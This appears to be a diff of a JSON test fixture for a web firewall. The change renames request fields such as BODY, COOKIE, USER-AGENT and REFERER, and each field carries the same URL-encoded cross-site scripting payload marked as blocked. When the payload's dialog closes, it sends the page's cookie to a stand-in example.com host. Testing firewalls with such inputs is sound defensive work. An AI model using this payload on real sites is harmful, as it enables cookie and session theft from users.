@@ -3,11 +3,11 @@
     {
       "URL": "%3Cdialog%20open%20onclose%20%3D%20%22a%3D%5Blocation.origin%2C%20%27%0A%40example.com%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B%22%3E%3Cform%20method%3Ddialog%3E%3Cbutton%3EA%3C%2Fbutton%3E%3C%2Fform%3E%3Cbr%3E",
       "ARGS": "%3Cdialog%20open%20onclose%20%3D%20%22a%3D%5Blocation.origin%2C%20%27%0A%40example.com%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B%22%3E%3Cform%20method%3Ddialog%3E%3Cbutton%3EA%3C%2Fbutton%3E%3C%2Fform%3E%3Cbr%3E",
-      "Body": "%3Cdialog%20open%20onclose%20%3D%20%22a%3D%5Blocation.origin%2C%20%27%0A%40example.com%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B%22%3E%3Cform%20method%3Ddialog%3E%3Cbutton%3EA%3C%2Fbutton%3E%3C%2Fform%3E%3Cbr%3E",
-      "Cookie": "%3Cdialog%20open%20onclose%20%3D%20%22a%3D%5Blocation.origin%2C%20%27%0A%40example.com%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B%22%3E%3Cform%20method%3Ddialog%3E%3Cbutton%3EA%3C%2Fbutton%3E%3C%2Fform%3E%3Cbr%3E",
-      "UA": "%3Cdialog%20open%20onclose%20%3D%20%22a%3D%5Blocation.origin%2C%20%27%0A%40example.com%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B%22%3E%3Cform%20method%3Ddialog%3E%3Cbutton%3EA%3C%2Fbutton%3E%3C%2Fform%3E%3Cbr%3E",
-      "Referer": "%3Cdialog%20open%20onclose%20%3D%20%22a%3D%5Blocation.origin%2C%20%27%0A%40example.com%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B%22%3E%3Cform%20method%3Ddialog%3E%3Cbutton%3EA%3C%2Fbutton%3E%3C%2Fform%3E%3Cbr%3E",
-      "Blocked": true
+      "BODY": "%3Cdialog%20open%20onclose%20%3D%20%22a%3D%5Blocation.origin%2C%20%27%0A%40example.com%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B%22%3E%3Cform%20method%3Ddialog%3E%3Cbutton%3EA%3C%2Fbutton%3E%3C%2Fform%3E%3Cbr%3E",
+      "COOKIE": "%3Cdialog%20open%20onclose%20%3D%20%22a%3D%5Blocation.origin%2C%20%27%0A%40example.com%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B%22%3E%3Cform%20method%3Ddialog%3E%3Cbutton%3EA%3C%2Fbutton%3E%3C%2Fform%3E%3Cbr%3E",
+      "USER-AGENT": "%3Cdialog%20open%20onclose%20%3D%20%22a%3D%5Blocation.origin%2C%20%27%0A%40example.com%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B%22%3E%3Cform%20method%3Ddialog%3E%3Cbutton%3EA%3C%2Fbutton%3E%3C%2Fform%3E%3Cbr%3E",
+      "REFERER": "%3Cdialog%20open%20onclose%20%3D%20%22a%3D%5Blocation.origin%2C%20%27%0A%40example.com%0A.com%27%2Clocation.pathname%2Ccookie%5D.join%60%60%3Blocation%3Da%3B%22%3E%3Cform%20method%3Ddialog%3E%3Cbutton%3EA%3C%2Fbutton%3E%3C%2Fform%3E%3Cbr%3E",
+      "BLOCKED": true
     }
   ]
 }
